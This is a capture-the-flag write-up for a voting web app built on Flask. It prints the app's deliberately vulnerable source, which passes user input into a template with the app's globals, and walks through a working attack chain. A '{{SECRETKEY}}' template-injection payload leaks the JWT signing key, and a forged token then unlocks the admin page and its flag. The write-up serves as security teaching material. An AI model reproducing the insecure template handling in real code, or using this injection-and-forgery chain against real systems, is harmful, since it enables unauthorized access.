---
layout: writeup
title: Template Token
tags: WebX
excerpt: "The citizens are voting, but it’s not the votes that matter - it’s the system that counts them. Cast your vote, inspect the results… but is that all there is? Your mission? Break into the admin panel and uncover the flag."
---

## Description

The citizens are voting, but it’s not the votes that matter - it’s the system that counts them.

Cast your vote, inspect the results… but is that all there is?

Your mission? Break into the admin panel and uncover the flag.

http://redac.ted:5000/

This challenge also provided the `app.py` file


## Solution

Here is the app.py file:

```python
import jwt
import datetime
import os
import re
from flask import Flask, render_template, render_template_string, request, jsonify
from functools import wraps
from dotenv import load_dotenv
from utils import db

load_dotenv()
app = Flask(__name__)

# secret key for our JWT signing! no one should know this
SECRETKEY = os.getenv("SECRETKEY")

def token_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        token = None

        auth_header = request.headers.get("Authorization", None)
        if auth_header and auth_header.startswith("Bearer "):
            token = auth_header.split()[1]

        if not token:
            return jsonify({"message":"Token is missing"}), 401

        try:
            payload = jwt.decode(token, SECRETKEY, algorithms=["HS256"])
            request.jwt_payload = payload

        except jwt.ExpiredSignatureError:
            return jsonify({"message":"Token has expired"}), 401

        except jwt.InvalidTokenError:
            return jsonify({"message":"Token is invalid"}), 401

        return f(*args, **kwargs)

    return wrapper

@app.route("/")
def home():
    return render_template("home.html")

@app.route("/admin")
@token_required
def admin():
    try:
        with open("/flag", "r") as f:
            flag_content = f.read().strip()
    except Exception:
        flag_content = "Unable to read /flag."

    return render_template("admin.html", flag=flag_content)

# sanitisation to prevent XSS and other injection attacks
def sanitize_input(user_input: str) -> str:
    return re.sub(r"[<>?,./;:|\\'\"\[\]\-=\(\)\*&\^%$#@!~]", "", user_input)

from utils import db  # make sure utils/db.py exists and is imported
# ...

@app.route("/vote", methods=["GET", "POST"])
def vote():
    if request.method == "GET":
        # Get candidates from the DB
        candidates = db.fetch_all_candidates()
        return render_template("vote.html", candidates=candidates)

    # POST: register vote
    candidate_raw = request.form.get("candidate", "")
    candidate = sanitize_input(candidate_raw)

    # Record the vote in the DB
    db.add_vote(username='voter', candidate_id=candidate)

    # Confirmation page
    template_source = f"""
	{% raw %}
    {{% extends "base.html" %}}
    {{% block content %}}
      <div style='text-align:center;padding-top:2rem'>
        <h1>Vote Confirmed</h1>
        You voted for: <br><strong>{candidate}</strong></p>

      </div>
    {{% endblock %}}
	{% endraw %}
    """
    return render_template_string(template_source, **globals())

app.run(host="0.0.0.0", port=5000, debug=True)
```

This is a pretty simple website. There is an `index` page, a `vote` page and an `admin` page. 

In order to see the admin page which has the flag on it, you need a valid JWT token which only allows the `HS256` algorithm and uses a set key, so there are no vulnerabilities there.

The index page just serves a static HTML page, so no vulnerability there

Finally, the vote page gets the user's input, sanitises it, and then displays a page with the said input on it.

Just a quick glance at how the vote page displays the user's input reveals a vulnerability. Instead of using jinja like your supposed to, the program gives the template all globals, and also the user's input is passed in through an f-string in python instead of specifically in jinja. This means that as long as we can get around the sanitisation, we can input jinja code into the template that will be executed. This could be useful for outputing any certain global variables... such as the `SECRETKEY` global variable.

The neccessary jinja to output the secret key would be `{{SECRETKEY}}` lets see if we can get this around the sanitisation.

Lukcily it is a horrible sanitisation method where any of these charcater `[<>?,./;:|\\'\"\[\]\-=\(\)\*&\^%$#@!~]` are removed from the string. Luckily `{` and `}` are not in this list, meaning we just need to vote for `{{SECRETKEY}}` and we get the secret key to sign our own JWT token and login to the admin page which gets us the flag.

```bash
$ curl -X POST "http://re.da.ct.ed:5000/vote" -d "candidate={{SECRETKEY}}"

    <!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>Vote x Vote</title>
    <style>
      body { font-family: Arial, sans-serif; margin: 0; padding: 0; }
      nav { background: #333; padding: 10px; }
      nav a { color: #fff; margin-right: 15px; text-decoration: none; }
      nav a:hover { text-decoration: underline; }
      .container { padding: 20px; }
    </style>
  </head>
  <body>
    <nav>
      <a href="/">Home</a>
      <a href="/vote">Vote</a>      <!-- Added Vote link -->
      <a href="/admin">Admin</a>
    </nav>
    <div class="container">

      <div style='text-align:center;padding-top:2rem'>
        <h1>Vote Confirmed</h1>
        You voted for: <br><strong>ldidyouknowthatshinigamisloveapples</strong></p>

      </div>

    </div>
  </body>
</html>
```

There is the secret key `ldidyouknowthatshinigamisloveapples`

so just some quick python in the terminal using `PyJWT` in order to create out own jwt token

```python
>>> import jwt
>>> jwt.encode({}, "ldidyouknowthatshinigamisloveapples", algorithm="HS256")
'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.dxgk4lCPRN6NdYYweVdcpIz0VSGl3IEV27ZzhxINRjQ'
```

The token checker just makes sure the token is properly signed, not that any info in it is correct, so I just signed an empty payload

Now time to make the request with the token

```bash
$ curl "http://re.da.ct.ed:5000/admin" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.dxgk4lCPRN6NdYYweVdcpIz0VSGl3IEV27ZzhxINRjQ"
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>Vote x Vote</title>
    <style>
      body { font-family: Arial, sans-serif; margin: 0; padding: 0; }
      nav { background: #333; padding: 10px; }
      nav a { color: #fff; margin-right: 15px; text-decoration: none; }
      nav a:hover { text-decoration: underline; }
      .container { padding: 20px; }
    </style>
  </head>
  <body>
    <nav>
      <a href="/">Home</a>
      <a href="/vote">Vote</a>      <!-- Added Vote link -->
      <a href="/admin">Admin</a>
    </nav>
    <div class="container">

  <h1>Admin Dashboard</h1>

  <p style="color: green; font-weight: bold;">
    FLAG: secedu{h0ld_my_s1gn4tur3s_pl34s3}
  </p>

    </div>
  </body>
</html>
```

There's the flag for us `secedu{h0ld_my_s1gn4tur3s_pl34s3}`
